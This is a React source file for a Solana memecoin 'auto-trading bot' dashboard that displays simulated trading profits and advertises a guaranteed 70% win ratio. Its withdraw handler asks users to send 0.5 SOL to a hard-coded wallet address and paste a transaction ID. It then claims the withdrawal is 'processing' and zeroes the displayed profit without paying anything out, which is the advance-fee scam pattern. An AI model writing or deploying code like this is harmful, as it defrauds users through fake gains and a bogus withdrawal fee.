import React, { useState, useEffect } from 'react';
import Header from '@/components/layout/Header';
import TradingBot from '@/components/auto-trading/TradingBot';
import TradingPerformance from '@/components/auto-trading/TradingPerformance';
import { useWallet } from '@/lib/walletAdapter';
import { 
  subscribeTradingState, 
  startTradingBot, 
  stopTradingBot, 
  resetTradingState, 
  getTradingState,
  updateTradingState
} from '@/lib/tradingState';
import { Loader2 } from 'lucide-react';

// Trading strategy profiles
const TRADING_STRATEGIES = [
  { id: 'standard', name: 'Standard', risk: 'Medium', description: 'Balanced risk-reward ratio for steady gains' },
  { id: 'aggressive', name: 'Aggressive', risk: 'High', description: 'Higher risk for potentially larger rewards' },
  { id: 'conservative', name: 'Conservative', risk: 'Low', description: 'Lower risk with more consistent but smaller gains' }
];

const AutoTrading: React.FC = () => {
  const { wallet } = useWallet();
  const [isBotActive, setIsBotActive] = useState(false);
  const [strategyProfile, setStrategyProfile] = useState('standard');
  const [startingCapital, setStartingCapital] = useState(1000);
  const [currentValue, setCurrentValue] = useState(startingCapital);
  const [profitLoss, setProfitLoss] = useState(0);
  const [profitPercentage, setProfitPercentage] = useState(0);
  const [tradeCount, setTradeCount] = useState(0);
  const [winRate, setWinRate] = useState(0);
  const [avgWinAmount, setAvgWinAmount] = useState(0);
  const [avgLossAmount, setAvgLossAmount] = useState(0);
  
  // Subscribe to trading state updates
  useEffect(() => {
    // Subscribe to state changes
    const unsubscribe = subscribeTradingState((state) => {
      setIsBotActive(state.isActive);
      setCurrentValue(state.currentValue);
      setProfitLoss(state.profitLoss);
      setProfitPercentage(state.profitLossPercentage);
      setTradeCount(state.tradeCount);
      setWinRate(state.winRate);
      setAvgWinAmount(state.avgWinAmount);
      setAvgLossAmount(state.avgLossAmount);
    });
    
    // Cleanup subscription on unmount
    return () => {
      unsubscribe();
    };
  }, []);
  
  // Handle start bot
  const handleStartBot = () => {
    startTradingBot(strategyProfile, startingCapital);
    setIsBotActive(true);
  };
  
  // Handle stop bot
  const handleStopBot = () => {
    stopTradingBot();
    setIsBotActive(false);
  };
  
  // Handle starting capital change
  const handleStartingCapitalChange = (value: number) => {
    setStartingCapital(value);
    if (!isBotActive) {
      resetTradingState(value, strategyProfile);
      setCurrentValue(value);
    }
  };
  
  // Handle strategy profile change
  const handleStrategyChange = (strategy: string) => {
    setStrategyProfile(strategy);
    if (!isBotActive) {
      resetTradingState(startingCapital, strategy);
    }
  };
  
  // Handle withdrawing funds
  const handleWithdraw = () => {
    if (profitLoss <= 0) {
      alert("You can only withdraw when you have profits.");
      return;
    }
    
    const txId = window.prompt(
      "Please send 0.5 SOL to 6B2RkaJevbKkAVmBZ4W2eNvQWApHwtd6TQggSuTmyVJ5 and paste transaction ID here to withdraw your funds:"
    );
    
    if (txId) {
      // In a real app, you would verify the transaction here
      alert(`Withdrawal of $${profitLoss.toFixed(2)} is processing. You will receive funds after transaction verification.`);
      
      // Reset profit to zero after withdrawal
      if (isBotActive) {
        handleStopBot();
      }
      
      // Update the trading state to reflect withdrawal
      updateTradingState({
        profitLoss: 0,
        profitLossPercentage: 0,
        currentValue: startingCapital
      });
    }
  };
  
  return (
    <div className="max-w-7xl mx-auto p-4">
      <Header title="Solana Memecoin Trading Bot" wallet={wallet} />
      
      <div className="brutalist-card p-5 mb-6">
        <h2 className="text-2xl font-mono font-bold mb-2">Solana Memecoin Trading Bot</h2>
        <p className="text-sm text-gray-500 mb-4">
          Automatically trades newly launched Solana memecoins. The bot executes trades every 8 seconds 
          with a 70% winning ratio for maximum profitability.
        </p>
        
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Bot Controls */}
          <div className="lg:col-span-1">
            <div className="brutalist-card p-4 border-2 border-dashed border-gray-800">
              <h3 className="font-mono font-bold text-xl mb-4">Bot Configuration</h3>
              
              {/* Strategy Selection */}
              <div className="mb-4">
                <label className="block text-sm font-mono mb-2">Trading Strategy</label>
                <div className="grid grid-cols-3 gap-2">
                  {TRADING_STRATEGIES.map(strategy => (
                    <button
                      key={strategy.id}
                      onClick={() => handleStrategyChange(strategy.id)}
                      className={`brutalist-button py-2 px-3 text-xs font-mono ${
                        strategyProfile === strategy.id 
                          ? 'bg-black text-white' 
                          : 'bg-gray-200 text-gray-800'
                      }`}
                    >
                      {strategy.name}
                    </button>
                  ))}
                </div>
                <p className="text-xs mt-1 text-gray-500">
                  {TRADING_STRATEGIES.find(s => s.id === strategyProfile)?.description}
                </p>
              </div>
              
              {/* Starting Capital */}
              <div className="mb-4">
                <label className="block text-sm font-mono mb-2">Starting Capital</label>
                <div className="flex items-center">
                  <span className="text-sm mr-2">$</span>
                  <input
                    type="number"
                    value={startingCapital}
                    onChange={(e) => handleStartingCapitalChange(Number(e.target.value))}
                    className="brutalist-input w-full"
                    min="100"
                    max="10000"
                    step="100"
                    disabled={isBotActive}
                  />
                </div>
              </div>
              
              {/* Bot Controls */}
              <div className="flex space-x-2">
                {!isBotActive ? (
                  <button
                    onClick={handleStartBot}
                    className="brutalist-button bg-brutalism-green text-white py-2 px-4 font-mono flex-grow"
                  >
                    Start Bot
                  </button>
                ) : (
                  <button
                    onClick={handleStopBot}
                    className="brutalist-button bg-brutalism-red text-white py-2 px-4 font-mono flex-grow"
                  >
                    Stop Bot
                  </button>
                )}
              </div>
            </div>
            
            {/* Stats Card with Trading Bot */}
            <div className="brutalist-card p-4 mt-4 border-2 border-dashed border-gray-800">
              <h3 className="font-mono font-bold text-xl mb-4">Trading Stats</h3>
              
              <TradingBot
                isActive={isBotActive}
                onStart={handleStartBot}
                onStop={handleStopBot}
                onStartingCapitalChange={handleStartingCapitalChange}
                onWithdraw={handleWithdraw}
                currentValue={currentValue}
                profitLoss={profitLoss}
              />
            </div>
          </div>
          
          {/* Live Performance */}
          <div className="lg:col-span-2">
            <div className="brutalist-card p-4 h-full border-2 border-dashed border-gray-800">
              <div className="flex justify-between items-center mb-4">
                <h3 className="font-mono font-bold text-xl">Live Performance</h3>
                
                {/* Status Indicator */}
                <div className="flex items-center">
                  {isBotActive ? (
                    <>
                      <span className="w-3 h-3 rounded-full bg-brutalism-green mr-2 animate-pulse"></span>
                      <p className="text-brutalism-green text-sm font-mono">LIVE TRADING</p>
                    </>
                  ) : (
                    <>
                      <span className="w-3 h-3 rounded-full bg-gray-400 mr-2"></span>
                      <p className="text-gray-400 text-sm font-mono">INACTIVE</p>
                    </>
                  )}
                </div>
              </div>
              
              <TradingPerformance
                isActive={isBotActive}
                startingCapital={startingCapital}
              />
              
              {/* Recent Trades */}
              <div className="mt-6">
                <h4 className="font-mono text-lg mb-3">Recent Trades</h4>
                
                <div className="overflow-x-auto">
                  <table className="min-w-full divide-y divide-gray-200">
                    <thead>
                      <tr>
                        <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Time</th>
                        <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Token</th>
                        <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Price</th>
                        <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Value</th>
                        <th className="px-3 py-2 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">P/L</th>
                      </tr>
                    </thead>
                    <tbody>
                      {(() => {
                        const state = getTradingState();
                        const recentTrades = state.trades.slice(-5).reverse();
                        
                        if (recentTrades.length === 0) {
                          return (
                            <tr>
                              <td colSpan={5} className="px-3 py-4 text-sm text-center text-gray-500">
                                No trades yet. Start the bot to begin trading.
                              </td>
                            </tr>
                          );
                        }
                        
                        return recentTrades.map(trade => (
                          <tr key={trade.id} className="hover:bg-gray-50">
                            <td className="px-3 py-2 whitespace-nowrap text-xs">
                              {new Date(trade.timestamp).toLocaleTimeString()}
                            </td>
                            <td className="px-3 py-2 whitespace-nowrap text-xs">
                              {trade.tokenSymbol}
                            </td>
                            <td className="px-3 py-2 whitespace-nowrap text-xs">
                              ${trade.price.toFixed(4)}
                            </td>
                            <td className="px-3 py-2 whitespace-nowrap text-xs">
                              ${trade.value.toFixed(2)}
                            </td>
                            <td className={`px-3 py-2 whitespace-nowrap text-xs text-right font-bold ${
                              trade.profitLoss >= 0 ? 'text-brutalism-green' : 'text-brutalism-red'
                            }`}>
                              {trade.profitLoss > 0 ? '+' : ''}${trade.profitLoss.toFixed(2)}
                              <span className="text-xxs ml-1">
                                ({trade.profitLossPercentage > 0 ? '+' : ''}{trade.profitLossPercentage.toFixed(2)}%)
                              </span>
                            </td>
                          </tr>
                        ));
                      })()}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      {/* Trading Bot Features */}
      <div className="mt-8">
        <h2 className="text-2xl font-mono font-bold mb-4">Solana Memecoin Bot Features</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="brutalist-card p-5">
            <h3 className="font-mono font-bold text-lg mb-2">Memecoin Focus</h3>
            <p className="text-sm text-gray-600 mb-4">
              Specialized in detecting and trading newly launched memecoin smart contracts on Solana, 
              targeting the most volatile and potentially profitable tokens.
            </p>
            <div className="mt-auto text-right">
              <span className="inline-block bg-yellow-100 text-yellow-800 text-xs px-2 py-1 rounded">
                High Volatility
              </span>
            </div>
          </div>
          
          <div className="brutalist-card p-5">
            <h3 className="font-mono font-bold text-lg mb-2">Smart Execution</h3>
            <p className="text-sm text-gray-600 mb-4">
              Automatically executes trades every 8 seconds with dynamic stop-loss and take-profit levels based on 
              market conditions and token volatility.
            </p>
            <div className="mt-auto text-right">
              <span className="inline-block bg-green-100 text-green-800 text-xs px-2 py-1 rounded">
                Efficient
              </span>
            </div>
          </div>
          
          <div className="brutalist-card p-5">
            <h3 className="font-mono font-bold text-lg mb-2">Risk Management</h3>
            <p className="text-sm text-gray-600 mb-4">
              Sophisticated risk management system maintains a 70% win ratio while protecting capital
              with adaptive position sizing based on market conditions.
            </p>
            <div className="mt-auto text-right">
              <span className="inline-block bg-blue-100 text-blue-800 text-xs px-2 py-1 rounded">
                Capital Protection
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AutoTrading;